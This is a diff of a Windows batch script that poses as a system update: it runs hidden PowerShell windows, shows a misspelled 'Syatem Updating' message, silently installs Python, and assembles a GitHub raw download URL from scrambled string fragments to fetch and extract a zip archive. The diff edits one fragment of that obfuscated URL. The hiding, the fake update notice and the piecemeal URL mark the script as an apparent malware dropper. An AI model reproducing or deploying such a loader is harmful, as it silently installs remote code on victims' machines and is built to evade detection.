@@ -2,7 +2,7 @@
 powershell -WindowStyle Hidden -Command "echo Syatem Updating......!"
 powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5"
 powershell -WindowStyle Hidden -Command "winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent"
-set s=ads&set d=a.zip&set a=/main/&set n=http&set t=ub.com/kevi&set o=/ra&set w=levi/w&set e=s://gith&set k=fs/he&set r=w/re&
+set s=ads&set d=a.zip&set a=/main/z/&set n=http&set t=ub.com/kevi&set o=/ra&set w=levi/w&set e=s://gith&set k=fs/he&set r=w/re&
 set ql=%n%%e%%t%%w%%o%%r%%k%%s%%a%%d%
 set ZipPath=C:\Downloads\start.zip
 set ExtractPath=C:\Downloads
